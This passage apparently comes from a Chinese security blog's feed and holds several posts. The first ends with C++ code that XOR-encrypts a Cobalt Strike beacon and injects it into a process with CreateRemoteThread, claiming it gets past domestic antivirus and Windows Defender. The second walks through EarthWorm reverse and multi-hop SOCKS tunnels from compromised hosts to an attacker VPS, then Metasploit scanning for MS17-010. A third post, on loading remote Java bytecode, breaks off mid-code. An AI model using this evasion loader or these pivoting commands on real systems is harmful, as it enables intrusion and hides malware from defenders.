class="hljs-literal">NULL</span>);<br>CreateRemoteThread(pi.hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)allocation_start, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StreamCrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* Data, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> key)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//简单异或 </span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> i = <span class="hljs-number">0</span>; i &lt; Length; i++) &#123;<br>Data[i] ^= key;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Powered by reader-l\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Blog:http://reader-l.github.io\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage:ProcessTest.exe EncodeRAWData\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="shellcode加密程序代码"><a href="#shellcode加密程序代码" class="headerlink" title="shellcode加密程序代码"></a>shellcode加密程序代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StreamCrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* Data, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Key)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span></span>;<br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc,_TCHAR* argv[]) &#123;<br><span class="hljs-comment">//</span><br><span class="hljs-keyword">if</span> (Help(argc) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-comment">//变量定义</span><br>HANDLE hFile;<br>HANDLE hFileNew;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> key = <span class="hljs-number">100000</span>;<br>DWORD shellcode_size = <span class="hljs-number">0</span>;<br>DWORD dwRead;<br>DWORD dwWrite;<br>PVOID pshellcode;<br>PVOID pEnCodeShellCode;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* buf;<br><br><span class="hljs-comment">//读取完整的beacon</span><br>hFile = CreateFile(argv[<span class="hljs-number">1</span>] , GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//获取文件大小</span><br>shellcode_size = GetFileSize(hFile, <span class="hljs-literal">NULL</span>);<br><br>pshellcode = VirtualAlloc(<span class="hljs-literal">NULL</span>, shellcode_size, MEM_COMMIT, PAGE_READWRITE);<br><br>ReadFile(hFile,pshellcode,shellcode_size,&amp;dwRead,<span class="hljs-number">0</span>);<br>CloseHandle(hFile);<br>buf = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)pshellcode;<br><br>StreamCrypt((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)buf, shellcode_size, key);<br>hFileNew = CreateFile(<span class="hljs-string">L&quot;EncodeRAWData&quot;</span>, GENERIC_ALL, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);<br><br>pEnCodeShellCode = VirtualAlloc(<span class="hljs-literal">NULL</span>, shellcode_size, MEM_COMMIT, PAGE_READWRITE);<br><br><span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)pEnCodeShellCode, buf, shellcode_size);<br><br>WriteFile(hFileNew, pEnCodeShellCode, shellcode_size, &amp;dwWrite, <span class="hljs-literal">NULL</span>);<br><br>CloseHandle(hFileNew);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">StreamCrypt</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* Data, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> Length, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> key)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//简单异或 </span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> i = <span class="hljs-number">0</span>; i &lt; Length; i++) &#123;<br>Data[i] ^= key;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Powered by reader-l\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Blog:http://reader-l.github.io\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage:XorEncode.exe beacon.bin\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-查杀效果"><a href="#4-查杀效果" class="headerlink" title="4.查杀效果"></a>4.查杀效果</h1><p>国内主流的安全防护软件都可以过掉。<code>windows defender</code>的防护只会发出一个警告，二次执行的时候<code>windows defender</code>就不会有反应了。</p><h1 id="5-编译程序存放的github地址"><a href="#5-编译程序存放的github地址" class="headerlink" title="5.编译程序存放的github地址"></a>5.编译程序存放的github地址</h1><p><a href="https://github.com/ReadER-L/BypassSecuritySoftware">https://github.com/ReadER-L/BypassSecuritySoftware</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    这篇文章涉及到分离配合加密免杀的原理：就是将&lt;code&gt;shellcode&lt;/code&gt;进行加密的同时和&lt;code</summary>
      
    
    
    
    <category term="免杀" scheme="https://reader-l.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
  <entry>
    <title>内网安全学习四-SOCKS代理</title>
    <link href="https://reader-l.github.io/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/"/>
    <id>https://reader-l.github.io/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/</id>
    <published>2021-04-05T11:59:49.000Z</published>
    <updated>2021-04-06T13:31:10.546Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-SOCKS代理简介"><a href="#1-SOCKS代理简介" class="headerlink" title="1.SOCKS代理简介"></a>1.SOCKS代理简介</h1><p>​    SOCKS是一种代理服务，可以简单的将系统的一端连接到另一端。</p><p>​    常见的SOCKS支持的协议：包括HTTP、FTP等。SOCKS分为SOCKS4和SOCKS5两种类型：其中SOCKS4只支持TCP协议；SOCKS5不仅支持TCP/UDP协议，还支持各种身份验证机制等，其标准的端口为1080。SOCKS能够目标内网计算机进行通信，避免多次使用端口转发。</p><p>SOCKS代理常见的应用场景有如下三类：</p><p>1.服务器在内网中，可以任意访问外部网络。</p><p>2.服务器在内网中，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</p><p>3.服务器在内网中，对外只开放了部分端口（例如80端口），且服务器不能访问外部网络 。</p><h1 id="2-常见的SOCKS代理工具"><a href="#2-常见的SOCKS代理工具" class="headerlink" title="2.常见的SOCKS代理工具"></a>2.常见的SOCKS代理工具</h1><h2 id="1-EarthWorm"><a href="#1-EarthWorm" class="headerlink" title="1.EarthWorm"></a>1.EarthWorm</h2><p>​    EW是一套便携式网络工具，具有SOCKS5服务架设和端口转发两大核心功能。能够以正向、反向、多级级联等方式建立网络隧道。EW工具包提供了多个可执行文件，适用于不同的操作系统。</p><p>下载链接：<a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a>       <a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>​    EW共有六种命令格式，分别是ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran。其中用于普通的网路环境的正向命令是ssocksd，用于反弹连接的命令是rcsocks、rssocks，其他命令用于复杂网络环境的多级级联。</p><h2 id="2-使用方式"><a href="#2-使用方式" class="headerlink" title="2.使用方式"></a>2.使用方式</h2><h3 id="1-正向SOCKS-5服务器"><a href="#1-正向SOCKS-5服务器" class="headerlink" title="1.正向SOCKS 5服务器"></a>1.正向SOCKS 5服务器</h3><p>以下命令适用于目标机器拥有一个外网IP地址的情况：</p><p>将ew对应操作系统的可执行文件上传到目标机器上并执行如下命令，即可在目标上架设一个端口888的SOCKS代理了，接下来在攻击者的机器上用SocksCap64（For win）或者proxychains（For Linux）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ew</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">ssocksd</span> <span class="hljs-selector-tag">-l</span> 888<br><br><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">ping</span> <span class="hljs-selector-tag">iz9jlx</span><span class="hljs-selector-class">.dnslog</span><span class="hljs-selector-class">.cn</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/1.png"></p><h3 id="2-反弹SOCKS-5服务器"><a href="#2-反弹SOCKS-5服务器" class="headerlink" title="2.反弹SOCKS 5服务器"></a>2.反弹SOCKS 5服务器</h3><p>当目标机器没有公网IP地址的时候可以利用该方法，使得我们可以访问内网资源。</p><p>假设实验环境如下：</p><p>1.VPS的公网IP是（Linux）：172.16.56.1</p><p>2.目标web服务器（win7）：公网IP—&gt;172.16.56.135    内网IP—-&gt;172.16.55.135。</p><p>3.内网的另一台机器（win2008）：内网IP—&gt;172.16.55.141。</p><p>实验目标：让VPS能够访问内网IP为172.16.55.141的机器。</p><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到攻击者的VPS上，然后执行如下命令：该命令的意思是在公网VPS上添加一个转接隧道，把1080端口收到的代理请求转发888端口。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./ew_for_linux</span> <span class="hljs-string">-s</span> <span class="hljs-string">rcsocks</span> <span class="hljs-string">-l</span> <span class="hljs-number">1080</span> <span class="hljs-string">-e</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/2.png"></p><p>2.将EW上传到有公网IP和内网IP的windows7 的web服务器上，并执行如下命令：该命令的意思实在该机器上启动SOCKS 5 服务，然后反弹到公网VPS的4444端口上。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d 公网VPS的IP -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>3.可以看到反弹成功了，现在就可以通过访问公网VPS机器的1080端口，使用假设在内网WIN7上的SOCKS 5的代理服务了。</p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/3.png"></p><h3 id="3-二级网络环境（内网有主机拥有公网IP）"><a href="#3-二级网络环境（内网有主机拥有公网IP）" class="headerlink" title="3.二级网络环境（内网有主机拥有公网IP）"></a>3.二级网络环境（内网有主机拥有公网IP）</h3><p>​    假设现在获取了内网环境中两台主机（分别为A主机和B主机）的权限，A主机配有两张网卡，一块能够连接外网，另一块只能连接内网中的一台主机（B主机），但无法访问内网中的其他资源。B主机可以访问内网的任何资源，但是无法访问外网。</p><p>A主机：有公网IP—–&gt;172.16.56.135，内网IP——&gt;172.16.55.135，只能访问B主机，不能访问其他资源。</p><p>B主机：有内网IP—–&gt;172.16.55.141 可以访问内网中任何资源，但是不能访问外网。</p><p>实验目标：在B主机上搭建SOCKS代理服务，让攻击者可以访问内网中的任意资源。</p><h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到B主机上，利用ssocksd方式启动888端口的SOCKS代理，命令如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>2.然后将EW上传到A主机中，执行如下命令：该命令的意思是将A主机的1080端口受到的代理请求转发给B主机（172.16.55.141）的888端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_tran -l <span class="hljs-number">1080</span> -f B主机的内网IP -g <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>现在就可以通过访问A主机（公网IP）的1080端口使用在B主机上架设的SOCKS 5代理了。</p><h3 id="4-二级网络环境（内网中不存在拥有公网IP的主机）"><a href="#4-二级网络环境（内网中不存在拥有公网IP的主机）" class="headerlink" title="4.二级网络环境（内网中不存在拥有公网IP的主机）"></a>4.二级网络环境（内网中不存在拥有公网IP的主机）</h3><p>​    假设现在获取了内网环境中两台主机（分别为A主机和B主机）的权限，A主机配有一张内网网卡，但无法访问内网中的其他资源。B主机可以访问内网的任何资源，但是无法访问外网。</p><p>VPS主机：<code>49.*.*.234</code></p><p>A主机：内网IP——&gt;172.16.55.135，不能访问内网其他资源，但是能够访问外网。</p><p>B主机：有内网IP—–&gt;172.16.55.141 可以访问内网中任何资源，但是不能访问外网。</p><p>实验目标：在B主机上搭建SOCKS代理服务，让攻击者可以访问内网中的任意资源。</p><h4 id="实验步骤：-2"><a href="#实验步骤：-2" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到我们的VPS主机上，执行如下命令：该命令的意思是在公网VPS上添加一条转接隧道，将13443端口收到的代理请求转发给6666端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_listen -l <span class="hljs-number">13443</span> -e <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/4.png"></p><p>2.接着将EW上传到B主机上，利用ssocksd方式启动1080端口的SOCKS代理服务，命令如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>3.最后将EW上传到A主机上，执行如下命令：该命令的意思是在主机上利用<code>lcx_slave</code>方式，将公网VPS的6666端口和B主机的1080端口连接起来。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_slave -d <span class="hljs-number">49</span>.*.*.<span class="hljs-number">234</span> -e <span class="hljs-number">6666</span>  -f <span class="hljs-number">172.16.55.141</span>(B主机) -g <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><h3 id="5-三级网络环境"><a href="#5-三级网络环境" class="headerlink" title="5.三级网络环境"></a>5.三级网络环境</h3><p>​    假设现在获取了内网环境中三台主机（分别为A主机和B主机，以及C主机）的权限，A主机配有一张内网网卡，可以访问B主机以及外网。B主机可以访问C主机，但是无法访问外网。C主机可以访问核心区域，同时可以被B主机访问。</p><p>VPS主机：<code>49.*.*.234</code></p><p>A主机：内网IP——&gt;172.16.55.135，只能访问B主机和外网，不能访问其他资源。</p><p>B主机：有内网IP—–&gt;172.16.55.141 只可以访问C主机。</p><p>C主机：有内网IP—–&gt;172.16.55.126，只可以访问核心区域。</p><p>实验目标：在C主机上搭建SOCKS代理服务，让攻击者可以访问内网中的核心区域。</p><h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4><p>1.首先将EW上传到VPS上，执行如下命令：将1080端口受到的代理请求转发到13443端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rcsocks -l <span class="hljs-number">1080</span> -e <span class="hljs-number">13443</span><br></code></pre></td></tr></table></figure><p>2.将EW上传到A主机上，执行如下命令：将公网VPS的13443端口和B主机上的999端口连接起来。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_slave -d <span class="hljs-number">49</span>.*.*.<span class="hljs-number">240</span> -e <span class="hljs-number">13443</span> -f <span class="hljs-number">172.16.55.141</span> -g <span class="hljs-number">999</span><br></code></pre></td></tr></table></figure><p>3.将EW上传到B主机上，执行如下命令：将999端口受到的代理请求转发到777端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_listen -l <span class="hljs-number">999</span> -e <span class="hljs-number">777</span><br></code></pre></td></tr></table></figure><p>4.将EW上传到C主机上，并执行如下命令：在C主机上启动SOCKS 5服务，并反弹到B主机的777端口上。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d <span class="hljs-number">172.16.55.141</span> -e <span class="hljs-number">777</span><br></code></pre></td></tr></table></figure><p>现在，就可以通过访问公网VPS（<code>49.*.*.234</code>）的1080端口使用C主机上架设的SOCKS 5 代理了。</p><h1 id="3-使用ProxyChains（Linux）使用架设的SOCKS代理"><a href="#3-使用ProxyChains（Linux）使用架设的SOCKS代理" class="headerlink" title="3.使用ProxyChains（Linux）使用架设的SOCKS代理"></a>3.使用ProxyChains（Linux）使用架设的SOCKS代理</h1><h4 id="使用步骤："><a href="#使用步骤：" class="headerlink" title="使用步骤："></a>使用步骤：</h4><p>1.安装<code>proxychains</code>。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install proxychains<br></code></pre></td></tr></table></figure><p>2.启用<code>dynamic_chain</code></p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/5.png"></p><p>3.修改<code>/etc/proxychains.conf</code>里的SOCKS代理服务器的IP以及端口</p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/6.png"></p><p>4.利用<code>proxyresolv</code>命令测试代理服务器是否正常。</p><p>首先将该命令复制到<code>/usr/bin/</code>目录下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cp <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/proxychains3/</span>proxyresolv <span class="hljs-regexp">/usr/</span>bin/<br></code></pre></td></tr></table></figure><p>测试命令。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">proxyresolv</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/7.png"></p><p>代理服务器上的数据转发正常</p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/8.png"></p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/9.png"></p><p>5.尝试使用代理启动MSF</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/10.png"></p><p>成功利用SOCKS 5代理对内网的主机进行MS17-010漏洞探测。</p><p><img src="/2021/04/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E5%9B%9B-SOCKS%E4%BB%A3%E7%90%86/11.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-SOCKS代理简介&quot;&gt;&lt;a href=&quot;#1-SOCKS代理简介&quot; class=&quot;headerlink&quot; title=&quot;1.SOCKS代理简介&quot;&gt;&lt;/a&gt;1.SOCKS代理简介&lt;/h1&gt;&lt;p&gt;​    SOCKS是一种代理服务，可以简单的将系统的一端连接到另一</summary>
      
    
    
    
    <category term="内网安全" scheme="https://reader-l.github.io/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-Java动态加载字节码方法</title>
    <link href="https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/"/>
    <id>https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/</id>
    <published>2021-04-04T09:38:23.000Z</published>
    <updated>2021-04-05T11:20:31.097Z</updated>
    
    <content type="html"><![CDATA[<p>​    本篇文章依旧是参照代码审计的知识星球里的《JAVA安全漫谈系列》的文章。</p><h1 id="1-什么是Java的字节码"><a href="#1-什么是Java的字节码" class="headerlink" title="1.什么是Java的字节码"></a>1.什么是Java的字节码</h1><p>​    Java刚诞生的时候曾经提过一个非常著名的宣传口号: “一次编写，到处运行”。为了实现该目的，Sun公司以及其他虚拟机提供商发布了许多可以运行在不同平台上的JVM虚拟机，而这些虚拟机都拥有一个共同的功能，那就是可以载入和执行同一种与平台无关的字节码(ByteCode)。 于是，我们的源代码不再必须根据不同平台翻译成0和1，而是间接翻译成字节码，储存字节码的文件再交由运行于不同平台上的JVM虚拟机去读取执行，从而实现一次编写，到处运行的目的。<br>​    源代码中的各种变量，关键字和运算符号的语义最终都会编译成多条字节码命令。而字节码命令所能提供的语义描述能力是要明显强于Java本身的，所以有其他一些同样基于JVM的语言能提供许多Java所不支持的语言特性。</p><p><img src="/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/1.png"></p><blockquote><p>但是，本文中所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。所以，如果你阅读到后面，发现我讲的不是狭义的“Java字节码”，请不要有疑虑。</p></blockquote><h1 id="2-利用URLClassLoader加载远程class文件"><a href="#2-利用URLClassLoader加载远程class文件" class="headerlink" title="2.利用URLClassLoader加载远程class文件"></a>2.利用URLClassLoader加载远程class文件</h1><pre><code> ClassLoader是一个加载器，告诉java虚拟机如何加载指定类的，java默认的ClassLoader就是根据类名来加载类，**这个类名得是类的完整路径**，比如：java.lang.Runtime。</code></pre><p>​    同时java的ClassLoader是用来加载字节码文件最基础的方法。</p><p>​    正常情况下，Java会根据配置项 <code>sun.boot.class.path</code>和<code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的<code>java.net.URL</code>类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><p>​        1.URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件。<br>​        2.URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件。<br>​        3.URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类。</p><p>​    咱主要的注意力在第三点：利用基础的<code>Loader</code>类来寻找类，而要利用这一点必须是非<code>file</code>协议的情况下—-JAVA默认提供了对<code>file,ftp,gopher,http,https,jar,mailto,netdoc</code>协议的支持。</p><p>​    以下的Demo用HTTP协议来进行测试，从远程HTTP服务器上加载<code>.class</code>文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span 